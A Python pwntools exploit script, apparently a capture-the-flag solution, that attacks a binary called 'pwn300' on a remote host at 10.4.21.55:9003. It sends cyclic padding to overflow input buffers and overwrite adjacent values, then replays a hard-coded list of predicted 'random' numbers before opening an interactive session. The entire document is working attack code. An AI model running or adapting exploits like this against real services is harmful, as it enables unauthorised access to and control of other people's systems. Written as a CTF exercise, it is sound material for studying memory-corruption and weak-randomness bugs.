#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

#  io = process("./pwn300")
io = remote("10.4.21.55", 9003)

offset = abs(0x2040 - 0x204C)
payload = cyclic(offset) + p32(0xff)
#  with open("payload", "w") as f:
    #  f.write(payload + "\n")
io.sendlineafter("(不多于10位) \n", payload)

offset = abs(0x19 - 0x10)
payload = cyclic(offset) + 'aaaa'
#  with open("payload", "a") as f:
    #  f.write(payload)
io.sendlineafter("(不多于6位的数字) \n", payload)

#  io.interactive()
random = [1214, 3063, 3503, 3819, 3895, 3202, 4077, 185, 3455, 4175, 1560, 3450, 3243, 1783, 4526, 580, 4268, 1787, 4583, 3635, 3923, 4263, 752, 2395, 2330, 2552, 1288, 2867, 1379, 1302, 676, 1011, 2112, 1438, 1719, 798, 2785, 1932, 1136, 1480, 1159, 3569, 2691, 4573, 3583, 438, 2433, 1725, 4535, 3741, 679, 421, 1963, 151, 2842, 1025, 1365, 520, 3296, 10, 2455, 2409, 2309, 3578, 2056, 811, 2514, 1316, 3891, 1883, 2886, 1833, 4082, 1184, 2648, 1844, 214, 4259, 3619, 1242, 1876, 3795, 3957, 4401, 101, 1602, 3949, 595, 669, 1155, 3688, 2854, 4556, 49, 3355, 2893, 3365, 2922, 1282, 2047]
for i in random:
    sleep(0.1)
    io.sendline(str(i))

io.interactive()
io.close()
